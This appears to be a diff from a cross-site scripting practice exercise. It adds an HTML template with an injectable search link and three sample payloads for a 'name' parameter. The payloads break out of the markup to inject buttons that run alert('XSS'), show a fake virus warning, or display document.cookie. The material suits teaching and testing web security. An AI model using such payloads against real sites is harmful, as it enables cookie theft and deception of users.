@@ -1,0 +1,16 @@
+    <html>
+        <head><title>Internet knows</title></head>
+        <body>
+           <!-- Would you like to know what internet thinks about you? Visit this <a href="https://www.bing.com/search?q={}" attribute="aaa">Link</a>
+        </body>
+    </html>
+           -->
+
+           http://127.0.0.1:5000/hello?name=button%22onclick=alert(%22XSS%22)%3EClickme%3C/button%3E%%3C/body%3E%3C/html%3E%3C!--
+
+
+hello?name="</a><button onclick="alert('You have a Virus!')">Click Me</button></body></html><!--
+
+-->
+
+hello?name="</a><button onclick="alert(document.cookie)">Get Cookie</button></body></html><!--
